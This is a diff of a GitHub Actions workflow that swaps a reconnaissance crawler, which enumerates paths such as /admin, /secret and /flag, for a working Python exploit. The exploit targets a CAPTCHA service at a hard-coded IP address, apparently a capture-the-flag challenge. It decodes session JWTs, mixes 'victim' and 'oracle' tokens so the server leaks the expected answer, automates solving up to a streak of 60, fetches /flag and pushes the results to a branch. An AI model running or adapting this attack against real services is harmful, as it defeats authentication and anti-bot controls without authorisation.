@@ -1,4 +1,4 @@
-name: tmp-captcha-probe
+name: tmp-captcha-exploit
 
 on:
   push:
@@ -10,183 +10,211 @@ permissions:
   contents: write
 
 jobs:
-  probe:
+  exploit:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Checkout temporary branch
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
         with:
           ref: tmp/captcha-probe-20260818
 
-      - name: Probe CAPTCHA service
+      - name: Test token-confusion paths and solve adaptively
         shell: bash
         run: |
-          rm -rf captcha-probe-results
-          mkdir -p captcha-probe-results
+          rm -rf captcha-exploit-results
+          mkdir -p captcha-exploit-results
           python3 - <<'PY'
           import base64
           import hashlib
           import http.cookiejar
           import json
           import os
-          import re
-          import socket
           import time
           import urllib.error
           import urllib.parse
           import urllib.request
-          from html.parser import HTMLParser
 
-          TARGET = 'http://3.35.97.192:39111'
-          OUT = 'captcha-probe-results'
+          BASE = 'http://3.35.97.192:39111'
+          OUT = 'captcha-exploit-results'
           os.makedirs(OUT, exist_ok=True)
+          events = []
+          counter = 0
 
-          class Parser(HTMLParser):
-              def __init__(self):
-                  super().__init__()
-                  self.refs = []
-                  self.forms = []
-                  self.current_form = None
-              def handle_starttag(self, tag, attrs):
-                  d = dict(attrs)
-                  for key in ('src', 'href'):
-                      if d.get(key):
-                          self.refs.append((tag, key, d[key]))
-                  if tag == 'form':
-                      self.current_form = {'attrs': d, 'inputs': []}
-                      self.forms.append(self.current_form)
-                  elif tag in ('input', 'button', 'textarea', 'select') and self.current_form is not None:
-                      self.current_form['inputs'].append({'tag': tag, **d})
-              def handle_endtag(self, tag):
-                  if tag == 'form':
-                      self.current_form = None
+          def dump_event(ev):
+              global counter
+              counter += 1
+              events.append(ev)
+              with open(os.path.join(OUT, f'{counter:03d}.json'), 'w', encoding='utf-8') as f:
+                  json.dump(ev, f, ensure_ascii=False, indent=2)
+              print(json.dumps(ev, ensure_ascii=False))
 
-          cj = http.cookiejar.CookieJar()
-          opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
-          opener.addheaders = [
-              ('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/151 Safari/537.36'),
-              ('Accept', 'text/html,application/xhtml+xml,application/json,image/avif,image/webp,*/*;q=0.8'),
-          ]
-          records = []
-          fetched = set()
-
-          def safe_name(url):
-              p = urllib.parse.urlparse(url)
-              raw = (p.path.strip('/') or 'root') + (('_' + p.query) if p.query else '')
-              raw = re.sub(r'[^A-Za-z0-9._-]+', '_', raw)[:100]
-              return raw + '_' + hashlib.sha256(url.encode()).hexdigest()[:10]
-
-          def fetch(url, label=None):
-              if url in fetched:
-                  return None
-              fetched.add(url)
-              name = safe_name(url)
-              rec = {'url': url, 'label': label, 'name': name}
-              start = time.time()
-              body = b''
+          def request(method, path, header_token=None, payload=None, save_body=False):
+              headers = {
+                  'User-Agent': 'Mozilla/5.0 Chrome/151',
+                  'Accept': '*/*',
+              }
+              body = None
+              if header_token is not None:
+                  headers['Authorization'] = f'Bearer {header_token}'
+              if payload is not None:
+                  body = json.dumps(payload).encode()
+                  headers['Content-Type'] = 'application/json'
+              req = urllib.request.Request(BASE + path, data=body, headers=headers, method=method)
+              started = time.time()
               try:
-                  req = urllib.request.Request(url, method='GET')
-                  with opener.open(req, timeout=10) as r:
-                      body = r.read(2_000_000)
-                      rec.update(status=getattr(r, 'status', None), final_url=r.geturl(),
-                                 headers=dict(r.headers.items()), elapsed=round(time.time()-start, 4),
-                                 body_len=len(body))
+                  with urllib.request.urlopen(req, timeout=12) as r:
+                      raw = r.read(2_000_000)
+                      status = r.status
+                      rh = dict(r.headers.items())
               except urllib.error.HTTPError as e:
-                  body = e.read(2_000_000)
-                  rec.update(status=e.code, final_url=e.geturl(), headers=dict(e.headers.items()),
-                             elapsed=round(time.time()-start, 4), body_len=len(body), http_error=str(e))
+                  raw = e.read(2_000_000)
+                  status = e.code
+                  rh = dict(e.headers.items())
               except Exception as e:
-                  rec.update(error=repr(e), elapsed=round(time.time()-start, 4))
-                  records.append(rec)
-                  return rec
-
-              open(os.path.join(OUT, name + '.body'), 'wb').write(body)
-              open(os.path.join(OUT, name + '.headers.json'), 'w', encoding='utf-8').write(
-                  json.dumps(rec, ensure_ascii=False, indent=2))
-              records.append(rec)
-              return rec, body
-
-          network = {'target': TARGET}
-          try:
-              network['reverse_dns'] = socket.gethostbyaddr('3.35.97.192')
-          except Exception as e:
-              network['reverse_dns_error'] = repr(e)
-          try:
-              s = socket.create_connection(('3.35.97.192', 39111), timeout=8)
-              network['tcp'] = 'connected'
-              s.close()
-          except Exception as e:
-              network['tcp_error'] = repr(e)
-          open(os.path.join(OUT, 'network.json'), 'w').write(json.dumps(network, indent=2))
-
-          root = fetch(TARGET + '/', 'root')
-          dynamic = []
-          if isinstance(root, tuple):
-              rec, body = root
-              text = body.decode('utf-8', 'replace')
-              parser = Parser()
+                  ev = {'method': method, 'path': path, 'error': repr(e), 'elapsed': round(time.time()-started, 4)}
+                  dump_event(ev)
+                  return ev, b''
+              ev = {
+                  'method': method, 'path': path, 'status': status,
+                  'elapsed': round(time.time()-started, 4), 'headers': rh,
+                  'body_len': len(raw), 'body_sha256': hashlib.sha256(raw).hexdigest(),
+              }
               try:
-                  parser.feed(text)
+                  ev['json'] = json.loads(raw)
               except Exception:
-                  pass
-              open(os.path.join(OUT, 'forms.json'), 'w', encoding='utf-8').write(
-                  json.dumps(parser.forms, ensure_ascii=False, indent=2))
-              open(os.path.join(OUT, 'refs.json'), 'w', encoding='utf-8').write(
-                  json.dumps(parser.refs, ensure_ascii=False, indent=2))
-              for tag, key, ref in parser.refs:
-                  u = urllib.parse.urljoin(rec.get('final_url') or TARGET + '/', ref)
-                  if urllib.parse.urlparse(u).netloc == urllib.parse.urlparse(TARGET).netloc:
-                      dynamic.append((u, f'{tag}:{key}'))
-              patterns = [
-                  r'''(?i)fetch\s*\(\s*["']([^"']+)["']''',
-                  r'''(?i)axios\.(?:get|post)\s*\(\s*["']([^"']+)["']''',
-                  r'''(?i)(?:url|endpoint)\s*[:=]\s*["']([^"']+)["']''',
-              ]
-              for pattern in patterns:
-                  for m in re.finditer(pattern, text):
-                      u = urllib.parse.urljoin(TARGET + '/', m.group(1))
-                      if urllib.parse.urlparse(u).netloc == urllib.parse.urlparse(TARGET).netloc:
-                          dynamic.append((u, 'inline-js'))
+                  if len(raw) <= 30000:
+                      ev['text'] = raw.decode('utf-8', 'replace')
+                  else:
+                      ev['body_b64_prefix'] = base64.b64encode(raw[:2000]).decode()
+              dump_event(ev)
+              if save_body:
+                  open(os.path.join(OUT, f'{counter:03d}.body'), 'wb').write(raw)
+              return ev, raw
 
-          common = [
-              '/robots.txt', '/favicon.ico', '/sitemap.xml',
-              '/captcha', '/captcha/', '/captcha/new', '/captcha/generate', '/captcha/image', '/captcha/verify',
-              '/api/captcha', '/api/captcha/new', '/api/captcha/generate', '/api/captcha/verify',
-              '/verify', '/api/verify', '/protected', '/api/protected', '/flag', '/api/flag',
-              '/admin', '/secret', '/static/app.js', '/app.js', '/main.js', '/script.js', '/static/js/app.js',
+          def start(label):
+              ev, _ = request('POST', '/start')
+              data = ev.get('json') or {}
+              token = data.get('token')
+              dump_event({'type': 'session', 'label': label, 'token': token, 'start': data})
+              if token and token.count('.') == 2:
+                  parts = token.split('.')
+                  try:
+                      pad = '=' * (-len(parts[1]) % 4)
+                      decoded = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
+                      dump_event({'type': 'jwt_payload', 'label': label, 'payload': decoded})
+                  except Exception as e:
+                      dump_event({'type': 'jwt_decode_error', 'label': label, 'error': repr(e)})
+              return token, data
+
+          def captcha(token, label):
+              ev, raw = request('GET', '/captcha', header_token=token, save_body=True)
+              nonce = ev.get('headers', {}).get('X-Round-Nonce') or ev.get('headers', {}).get('x-round-nonce')
+              info = {'type': 'captcha', 'label': label, 'nonce': nonce,
+                      'image_sha256': hashlib.sha256(raw).hexdigest(), 'status': ev.get('status')}
+              dump_event(info)
+              return nonce, raw, ev
+
+          def submit(header_token, body_token, nonce, answer, label):
+              ev, _ = request('POST', '/submit', header_token=header_token,
+                              payload={'token': body_token, 'answer': answer, 'round_nonce': nonce})
+              dump_event({'type': 'submit_result', 'label': label, 'response': ev.get('json'),
+                          'status': ev.get('status')})
+              return ev
+
+          # Capture schema first.
+          request('GET', '/openapi.json', save_body=True)
+
+          # Check whether independent sessions receive the same first image.
+          t1, _ = start('compare-A')
+          t2, _ = start('compare-B')
+          if t1 and t2:
+              n1, i1, _ = captcha(t1, 'compare-A')
+              n2, i2, _ = captcha(t2, 'compare-B')
+              dump_event({'type': 'cross_session_image_compare', 'same_image': i1 == i2,
+                          'same_nonce': n1 == n2, 'sha_a': hashlib.sha256(i1).hexdigest(),
+                          'sha_b': hashlib.sha256(i2).hexdigest(), 'nonce_a': n1, 'nonce_b': n2})
+
+          candidates = [
+              ('H=oracle,B=victim', 'oracle', 'victim'),
+              ('H=victim,B=oracle', 'victim', 'oracle'),
+              ('H=oracle,B=oracle', 'oracle', 'oracle'),
+              ('H=victim,B=victim-baseline', 'victim', 'victim'),
           ]
-          for u, label in dynamic[:60]:
-              fetch(u, label)
-          for path in common:
-              fetch(urllib.parse.urljoin(TARGET + '/', path), 'common-path')
+          working = None
 
-          cookies = [{k: getattr(c, k) for k in ('name','value','domain','path','secure','expires')} for c in cj]
-          open(os.path.join(OUT, 'cookies.json'), 'w', encoding='utf-8').write(
-              json.dumps(cookies, ensure_ascii=False, indent=2))
-          open(os.path.join(OUT, 'records.json'), 'w', encoding='utf-8').write(
-              json.dumps(records, ensure_ascii=False, indent=2))
-          summary = {'network': network, 'cookies': cookies, 'records': records}
-          open(os.path.join(OUT, 'summary.json'), 'w', encoding='utf-8').write(
-              json.dumps(summary, ensure_ascii=False, indent=2))
-          print(json.dumps(summary, ensure_ascii=False, indent=2))
+          for cname, hsel, bsel in candidates:
+              victim, _ = start(cname + ':victim')
+              oracle, _ = start(cname + ':oracle')
+              if not victim or not oracle:
+                  continue
+              toks = {'victim': victim, 'oracle': oracle}
+              observed = []
+              usable = True
+              for rno in (1, 2):
+                  nonce, image, cev = captcha(victim, f'{cname}:round{rno}')
+                  if not nonce:
+                      usable = False
+                      break
+                  leak = submit(toks[hsel], toks[bsel], nonce, 'aaaa', f'{cname}:leak{rno}')
+                  leakj = leak.get('json') or {}
+                  expected = leakj.get('expected_answer')
+                  if not expected:
+                      observed.append({'round': rno, 'leak': leakj, 'failure': 'no expected_answer'})
+                      usable = False
+                      break
+                  correct = submit(victim, victim, nonce, expected, f'{cname}:correct{rno}')
+                  cj = correct.get('json') or {}
+                  observed.append({'round': rno, 'expected': expected, 'leak': leakj, 'correct': cj})
+                  if not cj.get('correct'):
+                      usable = False
+                      break
+              dump_event({'type': 'candidate_summary', 'candidate': cname, 'observed': observed,
+                          'usable': usable})
+              if usable and len(observed) == 2 and observed[-1].get('correct', {}).get('streak') == 2:
+                  working = {'name': cname, 'header_select': hsel, 'body_select': bsel,
+                             'victim': victim, 'oracle': oracle,
+                             'current_streak': observed[-1]['correct']['streak']}
+                  dump_event({'type': 'working_candidate', **working})
+                  break
+
+          # Continue directly to 60 if token confusion preserved the victim streak.
+          solved = False
+          if working:
+              victim = working['victim']
+              oracle = working['oracle']
+              toks = {'victim': victim, 'oracle': oracle}
+              streak = int(working['current_streak'])
+              while streak < 60:
+                  nonce, image, cev = captcha(victim, f'solve:round{streak+1}')
+                  if not nonce:
+                      break
+                  leak = submit(toks[working['header_select']], toks[working['body_select']],
+                                nonce, 'aaaa', f'solve:leak{streak+1}')
+                  expected = (leak.get('json') or {}).get('expected_answer')
+                  if not expected:
+                      break
+                  corr = submit(victim, victim, nonce, expected, f'solve:correct{streak+1}')
+                  cj = corr.get('json') or {}
+                  if not cj.get('correct'):
+                      break
+                  streak = int(cj.get('streak', -1))
+                  if cj.get('solved'):
+                      solved = True
+                      break
+              dump_event({'type': 'solve_loop_end', 'streak': streak, 'solved': solved})
+              flag, _ = request('GET', '/flag', header_token=victim)
+              dump_event({'type': 'flag_result', 'response': flag.get('json'), 'status': flag.get('status')})
+
+          with open(os.path.join(OUT, 'events.json'), 'w', encoding='utf-8') as f:
+              json.dump(events, f, ensure_ascii=False, indent=2)
           PY
 
-      - name: Commit probe results to temporary branch
+      - name: Commit exploit results
         if: always()
         shell: bash
         run: |
           git config user.name 'github-actions[bot]'
           git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
-          git add -f captcha-probe-results
-          git commit -m 'chore: store temporary CAPTCHA probe results' || exit 0
+          git add -f captcha-exploit-results
+          git commit -m 'chore: store temporary CAPTCHA exploit results' || exit 0
           git push origin HEAD:tmp/captcha-probe-20260818
-
-      - name: Upload probe artifact
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: captcha-probe
-          path: captcha-probe-results/
-          if-no-files-found: warn
-          retention-days: 1
